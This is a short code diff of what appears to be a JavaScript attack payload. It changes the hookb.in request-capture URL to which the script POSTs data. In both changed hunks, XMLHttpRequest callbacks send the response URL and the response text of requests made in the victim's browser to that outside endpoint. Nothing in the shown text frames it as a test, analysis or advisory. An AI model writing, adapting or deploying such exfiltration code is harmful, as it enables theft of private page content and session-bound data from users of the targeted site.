@@ -12,7 +12,7 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/9XokkMx6jBsW1OXXwdE9', true);
+                xhr.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseURL));
 };
@@ -25,7 +25,7 @@ http.onreadystatechange = function() {
                 req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                 req.onload = function () {
                   const r = new XMLHttpRequest();
-                  r.open('POST', 'https://hookb.in/9XokkMx6jBsW1OXXwdE9', true);
+                  r.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
                   r.setRequestHeader('Content-type', 'application/json');
                   r.send(JSON.stringify(http.responseText));
                 };
